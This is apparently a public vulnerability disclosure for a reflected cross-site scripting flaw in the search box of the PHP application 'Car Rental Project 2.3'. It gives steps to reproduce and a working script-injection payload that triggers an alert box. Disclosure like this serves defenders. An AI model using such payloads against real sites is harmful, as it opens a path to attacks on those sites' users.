# Exploit Title: Car Rental Project 2.3 - 'Search' Cross-Site Scripting
# Date: 27/7/2021
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/car-rental-project-php-mysql-free-download/
# Version :  V 2.3
# Vulnerability Type: Cross-site Scripting
# Tested on Windows 10 、XAMPP
# This application is vulnerable to cross-site scripting vulnerability.
# Vulnerable script:


1.go to http://192.168.50.200/carrental/search.php  

2.Search box input payload ："><img src=1 onerror=alert(/xss/)>  

3.You will see your Javascript code executed.  

# Vulnerability proof: 
![image](https://github.com/BigTiger2020/Car-Rental-Project/blob/main/xss-1.png)  
  
![image](https://github.com/BigTiger2020/Car-Rental-Project/blob/main/xss-2.png)  
